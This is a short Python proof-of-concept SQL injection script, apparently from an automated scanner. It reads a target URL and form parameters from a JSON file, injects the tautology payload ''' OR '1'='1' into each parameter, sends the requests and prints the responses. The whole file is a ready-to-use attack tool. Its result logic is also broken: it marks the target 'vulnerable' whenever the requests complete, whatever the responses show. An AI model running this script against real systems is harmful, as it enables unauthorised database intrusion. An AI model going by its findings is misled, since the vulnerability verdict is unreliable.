import argparse
import json
import sys
import requests

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--input", required=True)
    args = parser.parse_args()

    with open(args.input, "r", encoding="utf-8") as f:
        payload = json.load(f)

    base_url = payload["base_url"].rstrip("/")
    path = payload.get("path", "")
    method = payload.get("method", "GET").upper()
    body_params = payload.get("body_params", {})

    url = f"{base_url}{path}"

    print(f"[DEBUG] url={url}", file=sys.stderr)
    print(f"[DEBUG] method={method}", file=sys.stderr)
    print(f"[DEBUG] original_body={body_params}", file=sys.stderr)

    test_values = [
        "' OR '1'='1",
    ]

    headers = {
        "User-Agent": "Scanner-033ca182-dcdd-406b-bcb5-816d726ca809",
    }

    results = []

    try:
        for target_key in body_params.keys():
            for test_value in test_values:
                test_body = body_params.copy()
                test_body[target_key] = test_value

                print(f"[DEBUG] target_key={target_key}", file=sys.stderr)
                print(f"[DEBUG] test_body={test_body}", file=sys.stderr)

                response = requests.request(method=method, url=url, data=test_body, headers=headers, timeout=5,)

                results.append({
                    "target_key": target_key,
                    "test_value": test_value,
                    "status_code": response.status_code,
                    "response_preview": response.text[:200],
                })

        result = {
            "poc_name": "sql_based",
            "status": "Completed",
            "description": "sql_based 실행 완료",
            "evidence": f"tested_keys={len(results)}",
            "raw_output": json.dumps(results, ensure_ascii=False),
            "vulnerable": True,
        }

    except Exception as e:
        result = {
            "poc_name": "sql_based",
            "status": "Error",
            "description": "PoC execution failed.",
            "evidence": str(e),
            "raw_output": "",
            "vulnerable": False,
        }

    print(json.dumps(result, ensure_ascii=False))


if __name__ == "__main__":
    main()